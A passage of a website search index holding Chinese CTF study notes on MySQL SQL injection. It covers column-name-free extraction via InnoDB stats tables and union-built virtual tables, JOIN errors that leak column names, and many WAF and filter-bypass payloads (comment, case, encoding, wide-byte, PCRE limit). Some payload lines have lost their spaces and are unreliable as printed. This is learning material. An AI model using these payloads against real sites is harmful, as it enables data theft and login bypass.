<p>\u4f46\u662f\u6211\u4eec\u4e0d\u662f\u968f\u65f6\u90fd\u80fd\u7528\u8fd9\u4e2a\u6570\u636e\u5e93\u7684\uff0c\u5982\u679c\u8fc7\u6ee4\u6389\u4e86information_schema,\u6211\u4eec\u8be5\u600e\u4e48\u529e\uff1f</p>"},{"location":"web_bak/sql/SQL_Injection/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/#_2","title":"\u65e0\u5217\u540d\u6ce8\u5165","text":"<p>\u9996\u5148\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e24\u79cd\u65b9\u6cd5\u6765\u67e5\u51fa\u8868\u540d\uff1a</p> <p>1.InnoDb\u5f15\u64ce</p> <p>\u4eceMYSQL5.5.8\u5f00\u59cb\uff0cInnoDB\u6210\u4e3a\u5176\u9ed8\u8ba4\u5b58\u50a8\u5f15\u64ce\u3002\u800c\u5728MYSQL5.6\u4ee5\u4e0a\u7684\u7248\u672c\u4e2d\uff0cinndb\u589e\u52a0\u4e86innodb_index_stats\u548cinnodb_table_stats\u4e24\u5f20\u8868\uff0c\u8fd9\u4e24\u5f20\u8868\u4e2d\u90fd\u5b58\u50a8\u4e86\u6570\u636e\u5e93\u548c\u5176\u6570\u636e\u8868\u7684\u4fe1\u606f\uff0c\u4f46\u662f\u6ca1\u6709\u5b58\u50a8\u5217\u540d\u3002</p> <p>2.sys\u6570\u636e\u5e93</p> <p>\u57285.7\u4ee5\u4e0a\u7684MYSQL\u4e2d\uff0c\u65b0\u589e\u4e86sys\u6570\u636e\u5e93\uff0c\u8be5\u5e93\u7684\u57fa\u7840\u6570\u636e\u6765\u81eainformation_schema\u548cperformance_chema\uff0c\u5176\u672c\u8eab\u4e0d\u5b58\u50a8\u6570\u636e\u3002\u53ef\u4ee5\u901a\u8fc7\u5176\u4e2d\u7684schema_auto_increment_columns\u6765\u83b7\u53d6\u8868\u540d\u3002</p> <pre><code>select table_name from mysql.innodb_index_stats \u8868\u540d\nselect database_name from mysql.innodb_index_stats \u5e93\u540d\nselect table_name from mysql.innodb_table_stats \u8868\u540d\nselect database_name from mysql.innodb_table_stats \u5e93\u540d\n</code></pre> <p>\u4f46\u662f\u4e0a\u8ff0\u4e24\u79cd\u65b9\u6cd5\u90fd\u53ea\u80fd\u67e5\u51fa\u8868\u540d\uff0c\u65e0\u6cd5\u67e5\u5230\u5217\u540d\uff0c\u8fd9\u65f6\u6211\u4eec\u5c31\u8981\u7528\u5230\u65e0\u5217\u540d\u6ce8\u5165\u4e86\u3002\u65e0\u5217\u540d\u6ce8\u5165\uff0c\u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u4e0d\u9700\u8981\u5217\u540d\u5c31\u80fd\u6ce8\u51fa\u6570\u636e\u7684\u6ce8\u5165\u3002</p> <p>\u5728\u53d6\u522b\u540d\u7684\u540c\u65f6\u67e5\u8be2\u6570\u636e\u3002</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u73b0\u5728\u6709\u4e00\u4e2a\u53ebxxx\u7684\u8868\uff0c\u8fd9\u4e2a\u8868\u6709\u4e09\u5217\uff0c\u5217\u540d\u5206\u522b\u4e3aid,user,password\u3002\u6b64\u65f6\uff0c\u6211\u4eec\u7528\u65e0\u5217\u540d\u67e5\u8be2\u7684\u65b9\u5f0f\u6765\u67e5\u4e00\u4e0b\u8868\u4e2d\u6570\u636e\u3002</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u6b64\u65f6\u5f97\u5230\u4e86\u4e00\u4e2a\u865a\u62df\u8868\uff0c\u5217\u540d\u5206\u522b\u4e3a1\uff0c2\uff0c3\uff0c\u5176\u4e2d\u5b58\u50a8\u4e86xxx\u8868\u4e2d\u7684\u6240\u6709\u6570\u636e\u3002</p> <p>\u6ce8\uff1a\u8fdb\u884c\u67e5\u8be2\u65f6\u8bed\u53e5\u7684\u5b57\u6bb5\u6570\u5fc5\u987b\u548c\u6307\u5b9a\u8868\u4e2d\u7684\u5b57\u6bb5\u6570\u4e00\u6837\uff0c\u4e0d\u80fd\u591a\u4e5f\u4e0d\u80fd\u5c11\uff0c\u4e0d\u7136\u5c31\u4f1a\u62a5\u9519</p> <p></p> <p>\u6211\u4eec\u8fdb\u884c\u65e0\u5217\u540d\u6ce8\u5165\u5c31\u662f\u5229\u7528\u4e86\u8be5\u65b9\u6cd5\uff0c\u901a\u8fc7\u65e0\u5217\u540d\u67e5\u8be2\u6784\u9020\u4e00\u4e2a\u865a\u62df\u8868\uff0c\u5728\u6784\u9020\u6b64\u8868\u7684\u540c\u65f6\u67e5\u8be2\u5176\u4e2d\u7684\u6570\u636e\u3002</p> <p></p> <p>\u50cf\u8fd9\u6837\u5c31\u53ef\u4ee5\u67e5\u8be2\u7b2c\u4e8c\u5217\u7684\u6570\u636e\uff0c\u5728\u865a\u62df\u8868\u4e2d\uff0c\u5217\u540d\u90fd\u662f1\uff0c2\uff0c3\uff0c\u6240\u4ee5\u6211\u4eec\u5728\u67e5\u8be2\u8bed\u53e5\u4e2d\u8981\u7528 <code>2</code> \u800c\u4e0d\u80fd\u76f4\u63a5\u7528 2 \u3002\u672b\u5c3e\u7684 n \u662f\u7528\u6765\u547d\u540d\u7684\uff0c\u4e5f\u53ef\u4ee5\u662f\u5176\u4ed6\u5b57\u7b26\u3002\u4e0d\u8fc7\u6709\u65f6\u5019 ` \u4e5f\u4f1a\u88ab\u8fc7\u6ee4\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u5c31\u53c8\u8981\u7528\u5230\u53d6\u522b\u540d\u7684\u64cd\u4f5c\u4e86\u3002</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u6b64\u65f6\u6784\u9020\u7684\u865a\u62df\u8868\u7684\u5217\u540d\u5c31\u5206\u522b\u662fa,b,c\u4e86\u3002\u6b64\u65f6\u67e5\u8be2\u5c31\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7a\uff0cb\uff0cc\u6765\u67e5\u3002</p> <p></p> <pre><code>select 1,2,3 union select * from sc;select `1` from (select 1,2,3 union select * from sc)a;select `2` from (select 1,2,3 union select * from sc)a;\nSQL\n</code></pre>"},{"location":"web_bak/sql/SQL_Injection/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/#_3","title":"\u65e0\u5217\u540d\u6ce8\u5165","text":""},{"location":"web_bak/sql/SQL_Injection/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/#join","title":"join","text":"<p>\u6b64join\u975e\u5f7cjoin\uff08\u6697\u793assti\u91cc\u9762\u7684join\u8fc7\u6ee4\u5668\uff09</p> <p>\u4e00\u822c\u4e5f\u7528\u8fd9\u4e2ajoin\u6765\u7ed5\u8fc7information_schema</p> <p>\u8bb2\u5b9e\u8bdd\u5e94\u8be5\u653e\u5230\u62a5\u9519\u6ce8\u5165\u91cc\u9762\u7684\u3002</p> <p>\u5229\u7528\u539f\u7406\u662f\u5217\u540d\u91cd\u590d</p> <p>select*from(selecta.1frommysql.user ajoinmysql.user b)c</p> <p></p> <p>\u67e5\u770b\u62a5\u9519\u4fe1\u606f\u3002</p> <p>\u518d\u7ed9\u4e00\u4e2a\uff1a</p> <pre><code>select * from user where id = -1 union all select * from (select * fromuser as a join user as b)as c;\n</code></pre> <p></p> <p>\u62a5\u9519\u51fa\u5217\u540d\u3002</p> <pre><code> select * from user where id = -1union all select*from (select * from user as a join user b using(id,username,passwd,phone))c;\n</code></pre> <p>\u540c\u6837\u7684\u4e5f\u53ef\u4ee5\u7ee7\u7eed\u53bb\u5229\u7528\uff0c\u7136\u540e\u8bfb\u53d6\u5b57\u6bb5</p> <p></p> <p>\u4f8b\u9898</p> <p>SWPU2019 web1\u7684wp\u3002</p>"},{"location":"web_bak/sql/SQL_Injection/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/#_4","title":"\u65e0\u5217\u540d\u6ce8\u5165","text":"<p>\u653e\u51e0\u5f20\u81ea\u5df1\u5b9e\u9a8c\u7684\u7ed3\u679c\uff1a</p> <p></p> <p></p>"},{"location":"web_bak/sql/SQL_Injection/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/","title":"\u8054\u5408\u67e5\u8be2","text":"<p>union select \u7684\u7528\u6cd5\u548c\u6027\u8d28\u5c31\u4e0d\u5728\u6b64\u8d58\u8ff0</p> <p>\u8fd9\u91cc\u662f\u6211\u7b14\u8bb0\u4e2d\u7684\u4e00\u4e2a\u6027\u8d28\uff0c\u5f88\u9057\u61be\uff0c\u6211\u6ca1\u6709\u8bb0\u5f55\u4f8b\u9898</p>"},{"location":"web_bak/sql/SQL_Injection/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/#_2","title":"\u8054\u5408\u67e5\u8be2\u5e76\u4e0d\u5b58\u5728\u7684\u6570\u636e\u65f6\uff0c\u8054\u5408\u67e5\u8be2\u5c31\u4f1a\u6784\u9020\u4e00\u4e2a\u865a\u62df\u7684\u6570\u636e\u3002","text":"<p>\u6709\u4e0a\u9762\u8fd9\u6837\u4e00\u53e5\u8bdd</p> <p>\u6b63\u5e38\uff1a</p> <p></p> <p>\u5c06\u7b2c\u4e00\u4e2a\u53c2\u6570\u6539\u4e3a\u6570\u636e\u5e93\u4e2d\u4e0d\u5b58\u5728\u7684\u503c\uff1a</p> <p></p> <p>\u56e0\u4e3aaaa\u5e76\u4e0d\u5b58\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u8be5\u67e5\u8be2\u4ec5\u8fd4\u56de\u8fde\u4e2a\u67e5\u8be2\u7684\u7b2c\u4e8c\u4e2a\u67e5\u8be2\uff0c\u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u91cc\u7684passwd\u5b57\u6bb5\u662f\u6211\u4eec\u53ef\u63a7\u7684\uff0c\u800c\u7528\u6237\u8f93\u5165\u7684password\u4e5f\u662f\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u3002</p> <p>\u591a\u8bf4\u4e00\u70b9\uff1a\u6211\u8bb0\u5f97\u901a\u8fc7\u8fd9\u4e2a\u6027\u8d28\u53ef\u4ee5\u8fbe\u5230\u4fee\u6539\u865a\u62df\u8868\u4e2d\u7684\u6570\u636e\uff0c\u7136\u540e\u5982\u679c\u540e\u53f0\u8bed\u53e5\u4f7f\u7528\u8054\u5408\u67e5\u8be2\u6765\u8fdb\u884c\u64cd\u4f5c\u5904\u7406\u65f6\uff0c\u76f8\u5f53\u4e8e\u5b83\u6240\u4f7f\u7528\u7684\u8868\u4e2d\u53c2\u6570\u5df2\u7ecf\u53ef\u4ee5\u88ab\u6211\u4eec\u63a7\u5236\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u8fd9\u4e2a\u865a\u62df\u8868\u6570\u636e\u6765\u8fdb\u884c\u8ba4\u8bc1\u3002</p>"},{"location":"web_bak/sql/SQL_Injection/%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2/#_3","title":"\u8054\u5408\u67e5\u8be2\u793a\u4f8b","text":""},{"location":"web_bak/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/","title":"SQL\u6ce8\u5165\u7ed5\u8fc7\u59ff\u52bf","text":"<p>sql\u6ce8\u5165\u7684\u539f\u7406\u4e86\u89e3\u4e86\u4e2a\u5927\u6982\u5176\u5b9e\u4e5f\u5c31\u5dee\u4e0d\u591a\u4e86\uff0c\u8fd9\u4e2a\u6a21\u5757\u662f\u59ff\u52bf\u591a\uff0c\u4f46\u662f\u6f0f\u6d1e\u81ea\u8eab\u5e94\u8be5\u5e76\u6ca1\u6709\u4ec0\u4e48\u7279\u522b\u503c\u5f97\u6316\u6398\u7684\u5730\u65b9\uff08\u5982\u679c\u6709\u7684\u8bdd\uff1a\u6c38\u8fdc\u4e0d\u8981\u76f8\u4fe1\u7528\u6237\u7684\u8f93\u5165\uff01\uff01\uff01\uff09\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e9b\u8fdb\u9636\u7684\u59ff\u52bf\uff0c\u672c\u4eba\u80fd\u529b\u6709\u9650\uff0c\u5982\u679c\u53d1\u73b0\u65b0\u59ff\u52bf\u968f\u65f6\u6b22\u8fce\u4ea4\u6d41\u5199\u5165\uff1a</p>"},{"location":"web_bak/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#1-a0","title":"1.\u7ed5\u8fc7\u7a7a\u683c\uff08\u6ce8\u91ca\u7b26/ /\uff0c%a0\uff09","text":"<p>\u76f4\u63a5\u6765\u770b\u59ff\u52bf\u597d\u4e86</p> <pre><code>\u4e24\u4e2a\u7a7a\u683c\u4ee3\u66ff\u4e00\u4e2a\u7a7a\u683c\uff0c\u7528Tab\u4ee3\u66ff\u7a7a\u683c\uff0c%a0=\u7a7a\u683c%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/\u5176\u4e2d%09\u9700\u8981php\u73af\u5883\uff0c%0a\u4e3a\\n/!select/\u4e3amysql\u72ec\u6709\u3002\u5e38\u89c1\u7528\u6cd5\u4e3a/!50727select 1/\uff0c\u5373\u5f53\u7248\u672c\u53f7\u5c0f\u4e8e\u7b49\u4e8e50727\u65f6\u6267\u884cselect 1\u5176\u5b9e/**/\u4e5f\u5c31\u662f\u6ce8\u91ca\u6cd5\u662f\u7528\u7684\u6700\u591a\u7684select/**/schema_name/**/from/**/information_schema.schemata\u66ff\u6362\u4e00\u4e0b\uff0c\u95ee\u9898\u4e0d\u5927\u3002\n</code></pre> <p>\u4e0a\u9762\u7684\u90fd\u662f\u66ff\u6362\uff0c\u7136\u540e</p> <p>\u5728MySQL\u4e2d\uff0c\u62ec\u53f7\u662f\u7528\u6765\u5305\u56f4\u5b50\u67e5\u8be2\u7684\u3002\u56e0\u6b64\uff0c\u4efb\u4f55\u53ef\u4ee5\u8ba1\u7b97\u51fa\u7ed3\u679c\u7684\u8bed\u53e5\uff0c\u90fd\u53ef\u4ee5\u7528\u62ec\u53f7\u5305\u56f4\u8d77\u6765\u3002\u800c\u62ec\u53f7\u7684\u4e24\u7aef\uff0c\u53ef\u4ee5\u6ca1\u6709\u591a\u4f59\u7684\u7a7a\u683c\u3002</p> <pre><code>select(user())from dual where(1=1)and(ha2=2)\n</code></pre> <p>\u6628\u5929\u5728\u7fa4\u91cc\u9762py\u7684[0xfor x in [1,2,3]]\u8fd4\u56de15\u662f\u4e0d\u662f\u4e5f\u5dee\u4e0d\u591a\u7684\u611f\u89c9\u3002</p>"},{"location":"web_bak/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#2","title":"2.\u7ed5\u8fc7\u5355\u5f15\u53f7","text":"<p>\u8fd9\u4e2a\u8fc7\u6ee4\u7684\u8bdd\u4f1a\u6bd4\u8f83\u5934\u75bc\uff0c\u4f46\u4e5f\u4e0d\u662f\u5b8c\u5168\u6ca1\u6709\u529e\u6cd5</p> <pre><code>select column_name  from information_schema.tables where table_name=\"users\"\u3000users\u7684\u5341\u516d\u8fdb\u5236\u7684\u5b57\u7b26\u4e32\u662f7573657273\u3002\u90a3\u4e48\u6700\u540e\u7684sql\u8bed\u53e5\u5c31\u53d8\u4e3a\u4e86select column_name  from information_schema.tables where table_name=0x7573657273\u53c8\u6216\u8005\u662f\u4e0b\u9762\u7684%bf%270xbf27\u4e0d\u662f\u6709\u4e00\u4e2a\u6709\u6548\u7684GBK\u5b57\u7b26\uff0c\u4f46\u662f\u7ecf\u8fc7addslashed()\u8f6c\u6362\u540e\u5c31\u53d8\u62100xbf5c27,0xbf5c\u662f\u4e2a\u6709\u6548\u7684GBK\u5b57\u7b26\uff0c\u6240\u4ee50xbf5c27\u4f1a\u5f53\u4f5c\u4e00\u4e2a\u5b57\u7b260xbf5c\u548c\u4e00\u4e2a\u5355\u7ef0\u53f7\u6765\u5904\u7406\uff0c\u7ed3\u679c\u662f\u8ddf\u5728\u5f15\u53f7\u540e\u67e5\u8be2\u8bed\u53e5\u5f97\u5230\u4e86\u6267\u884c\u3002\u5728phpcms2007\u7a0b\u5e8f\u91cc\u7531\u591a\u5b57\u8282\u7f16\u7801\u6f0f\u6d1e\u5f15\u53d1\u7684\u6f0f\u6d1e\u6709\u591a\u4e2a\uff0c\u4ee5area.php\u6587\u4ef6\u91cc\u7684\u6f0f\u6d1e\u6765\u4f5c\u6d4b\u8bd5\u3002\u6240\u4ee5\u8fd9\u4e2a\u8981\u6c42\u5c31\u76f8\u5bf9\u6765\u8bf4\u6bd4\u8f83\u9ad8\u4e86\u3002\u9700\u8981\u6709addslashed()\u8fd9\u4e2a\u8fc7\u6ee4\u51fd\u6570\n</code></pre> <p>\u9664\u4e86\u4e0a\u9762\u7684\u6211\u4eec\u8fd8\u53ef\u4ee5\u4f7f\u7528\u8f6c\u4e49\u7b26\\</p> <p>\u81f3\u4e8e\u539f\u7406\uff1f\u4ee5\u4e0b\u9762\u7684\u4e3a\u4f8b\u5b57\uff0c\u4f46\u4e0d\u505a\u8fc7\u591a\u89e3\u91ca(\u7b2c6\u884c\u6211\u662f\u6545\u610f\u6362\u7684\u884c)</p> <pre><code>select * from user_table where username=' username ' and password='  password '\nselect * from user_table where username='username\\' and password =' and union select xxx\n</code></pre>"},{"location":"web_bak/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#3","title":"3.\u9017\u53f7\u7ed5\u8fc7","text":"<p>\u5728\u4f7f\u7528\u76f2\u6ce8\u7684\u65f6\u5019\uff0c\u9700\u8981\u4f7f\u7528\u5230substr(),mid(),limit\u3002\u8fd9\u4e9b\u5b50\u53e5\u65b9\u6cd5\u90fd\u9700\u8981\u4f7f\u7528\u5230\u9017\u53f7\u3002\u5bf9\u4e8esubstr()\u548cmid()\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u4f7f\u7528<code>from to</code>\u7684\u65b9\u5f0f\u6765\u89e3\u51b3\uff1a</p> <pre><code>select substr(database() from 1 for 1);select mid(database() from 1 for 1);\n</code></pre> <p>\u4f7f\u7528join\uff1a</p> <pre><code>union select 1,2     #\u7b49\u4ef7\u4e8eunion select * from (select 1)a join (select 2)b\n</code></pre> <p>\u4f7f\u7528like\uff1a</p> <pre><code>select ascii(mid(user(),1,1))=80   #\u7b49\u4ef7\u4e8eselect user() like 'r%'\n</code></pre> <p>\u5bf9\u4e8e<code>limit</code>\u53ef\u4ee5\u4f7f\u7528<code>offset</code>\u6765\u7ed5\u8fc7\uff1a</p> <pre><code>select * from news limit 0,1# \u7b49\u4ef7\u4e8e\u4e0b\u9762\u8fd9\u6761SQL\u8bed\u53e5select * from news limit 1 offset 0\n</code></pre>"},{"location":"web_bak/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#5sqlmap","title":"5.\u6bd4\u8f83\u7b26\u53f7\uff08&lt;&gt;\uff09\u7ed5\u8fc7\uff08\u8fc7\u6ee4\u4e86&lt;&gt;\uff1asqlmap\u76f2\u6ce8\u7ecf\u5e38\u4f7f\u7528&lt;&gt;\uff09","text":"<pre><code>\u4f7f\u7528greatest()\u3001least\uff08\uff09\uff1a\uff08\u524d\u8005\u8fd4\u56de\u6700\u5927\u503c\uff0c\u540e\u8005\u8fd4\u56de\u6700\u5c0f\u503c\uff09#\n\n\u540c\u6837\u662f\u5728\u4f7f\u7528\u76f2\u6ce8\u7684\u65f6\u5019\uff0c\u5728\u4f7f\u7528\u4e8c\u5206\u67e5\u627e\u7684\u65f6\u5019\u9700\u8981\u4f7f\u7528\u5230\u6bd4\u8f83\u64cd\u4f5c\u7b26\u6765\u8fdb\u884c\u67e5\u627e\u3002\u5982\u679c\u65e0\u6cd5\u4f7f\u7528\u6bd4\u8f83\u64cd\u4f5c\u7b26\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u4f7f\u7528\u5230greatest\u6765\u8fdb\u884c\u7ed5\u8fc7\u4e86\u3002\n\u6700\u5e38\u89c1\u7684\u4e00\u4e2a\u76f2\u6ce8\u7684sql\u8bed\u53e5\uff1a\nselect * from users where id=1 and ascii(substr(database(),0,1))&gt;64\n\u6b64\u65f6\u5982\u679c\u6bd4\u8f83\u64cd\u4f5c\u7b26\u88ab\u8fc7\u6ee4\uff0c\u4e0a\u9762\u7684\u76f2\u6ce8\u8bed\u53e5\u5219\u65e0\u6cd5\u4f7f\u7528,\u90a3\u4e48\u5c31\u53ef\u4ee5\u4f7f\u7528greatest\u6765\u4ee3\u66ff\u6bd4\u8f83\u64cd\u4f5c\u7b26\u4e86\u3002greatest(n1,n2,n3,...)\u51fd\u6570\u8fd4\u56de\u8f93\u5165\u53c2\u6570(n1,n2,n3,...)\u7684\u6700\u5927\u503c\u3002\n\u90a3\u4e48\u4e0a\u9762\u7684\u8fd9\u6761sql\u8bed\u53e5\u53ef\u4ee5\u4f7f\u7528greatest\u53d8\u4e3a\u5982\u4e0b\u7684\u5b50\u53e5:\nselect * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64\n\u4f7f\u7528between and\uff1a\n#\nbetween a and b\uff1a\nbetween 1 and 1; \u7b49\u4ef7\u4e8e =1\n</code></pre>"},{"location":"web_bak/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#6or-and-xor-not","title":"6.or and xor not\u7ed5\u8fc7\uff1a","text":"<pre><code>and=&amp;&amp;  or=||   xor=|   not=!\n</code></pre>"},{"location":"web_bak/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#7-","title":"7.\u7ed5\u8fc7\u6ce8\u91ca\u7b26\u53f7\uff08#\uff0c--(\u540e\u9762\u8ddf\u4e00\u4e2a\u7a7a\u683c\uff09\uff09\u8fc7\u6ee4","text":"<pre><code>id=1' union select 1,2,3||'1\u3000\u6700\u540e\u7684or '1\u95ed\u5408\u67e5\u8be2\u8bed\u53e5\u7684\u6700\u540e\u7684\u5355\u5f15\u53f7\uff08\u8fd8\u662f\u7275\u626f\u5230\u4e00\u4e9bor\uff0c\u548cc\u8bed\u8a00\u4e00\u6837\uff0c\u524d\u9762\u7684\u9519\u4e86\u518d\u8bf4\uff09\u6216\u8005\uff1a\nid=1' union select 1,2,'3\n</code></pre>"},{"location":"web_bak/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#8","title":"8.=\u7ed5\u8fc7","text":"<pre><code>\u4f7f\u7528like \u3001rlike \u3001regexp \u6216\u8005 \u4f7f\u7528&lt; or &gt;\n</code></pre>"},{"location":"web_bak/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#9union-selectwhere","title":"9.\u7ed5\u8fc7union select\uff0cwhere\u7b49","text":"<pre><code>\uff081\uff09\u4f7f\u7528\u6ce8\u91ca\u7b26\u7ed5\u8fc7\uff1a#\n\u5e38\u7528\u6ce8\u91ca\u7b26\uff1a\uff08\u8d85\u5f3a\u7684\u6ce8\u91ca\uff01\uff09\n//\uff0c-- , /**/, #, --+, -- -, ;,%00,--a\n\u7528\u6cd5\uff1a\nU/**/ NION /**/ SE/**/ LECT /**/user\uff0cpwd from user\n\uff082\uff09\u4f7f\u7528\u5927\u5c0f\u5199\u7ed5\u8fc7\uff1a#\nid=-1'UnIoN/**/SeLeCT\n\uff083\uff09\u5185\u8054\u6ce8\u91ca\u7ed5\u8fc7\uff1a#\nid=-1'/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#\n\uff084\uff09 \u53cc\u5173\u952e\u5b57\u7ed5\u8fc7\uff08\u82e5\u5220\u9664\u6389\u7b2c\u4e00\u4e2a\u5339\u914d\u7684union\u5c31\u80fd\u7ed5\u8fc7\uff09\uff1a#\nid=-1'UNIunionONSeLselectECT1,2,3\u2013-\n</code></pre> <p>\u6700\u540e\u4e00\u4e2a\u662f\u67d0\u9053\u539f\u9898\uff0c\u975e\u5e38\u62b1\u6b49\u5fd8\u8bb0\u5728\u54ea\u4e86\u3002</p>"},{"location":"web_bak/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#10","title":"10.\u901a\u7528\u7ed5\u8fc7\uff08\u7f16\u7801\uff09","text":"<p>\u5982URLEncode\u7f16\u7801\uff0cASCII,HEX,unicode\u7f16\u7801\u7ed5\u8fc7\uff1a</p> <pre><code>or 1=1\u5373%6f%72%20%31%3d%31\uff0c\u800cTest\u4e5f\u53ef\u4ee5\u4e3aCHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)\u3002\n</code></pre>"},{"location":"web_bak/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#11","title":"11.\u7b49\u4ef7\u51fd\u6570\u7ed5\u8fc7","text":"<pre><code>hex()\u3001bin() ==&gt; ascii()[ord()?]\nsleep() ==&gt;benchmark()\nconcat_ws()==&gt;group_concat()\nmid()\u3001substr() ==&gt; substring()\n@@user ==&gt; user()\n@@datadir ==&gt; datadir()\n\u4e3e\u4f8b\uff1asubstring()\u548csubstr()\u65e0\u6cd5\u4f7f\u7528\u65f6\uff1a?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74\n\u6216\u8005\uff1asubstr((select 'password'),1,1) = 0x70strcmp(left('password',1), 0x69) = 1strcmp(left('password',1), 0x70) = 0strcmp(left('password',1), 0x71) = -1\n</code></pre>"},{"location":"web_bak/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#12pcre","title":"12.PCRE\u7ed5\u8fc7","text":"<pre><code>union/*'+'a'*1000001+'*/select\n</code></pre> <p>\u8fd9\u4e2a\u539f\u7406\u6211\u4e00\u5b9a\u4f1a\u6709\u673a\u4f1a\u4ecb\u7ecd\u7684\u3002</p> <p>\u7a0d\u5fae\u89e3\u91ca\uff1apcre\u6709\u5339\u914d\u4e0a\u9650\u7684\u9650\u5236\uff0c\u503c\u4e3a1000000\uff0c\u5e76\u4e14\u5339\u914d\u8bed\u53e5\uff08preg\u51fd\u6570\uff09\u4e2d\u5fc5\u987b\u8981\u6709\u4e00\u4e2a.\u8fd9\u6837\u5728\u5339\u914d\u65f6\u4ed6\u78b0\u5230\u8fd9\u4e2a\u5c31return\uff08\u6709\u70b9\u50cf\u9012\u5f52\uff09\u4e00\u6b21\uff0c\u8d85\u8fc7\u4e00\u767e\u4e07\u6b21\u540e\u51fd\u6570\u5931\u6548\u3002</p> <p>sql\u6ce8\u5165\u4e2d\u6211\u6682\u65f6\u7684\u6ca1\u9047\u89c1\u8fc7\uff0c\u6240\u4ee5\u8fd9\u4e2a10000001\u6211\u4e5f\u4e0d\u592a\u61c2\uff08+1\u662f\u5e72\u561b\u7684\uff09\u3002</p>"},{"location":"web_bak/sql/SQL_Injection/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#13with-rollup","title":"13.WITH ROLLUP\u7ed5\u8fc7","text":"<p>\u4e0d\u89e3\u91ca\u4e86</p> <p>\u5b9e\u9a8c\u5427  \u56e0\u7f3a\u601d\u6c40\u7684\u7ed5\u8fc7  By  Assassin\uff08with rollup\u7edf\u8ba1\uff09_Assassin-CSDN\u535a\u5ba2</p> 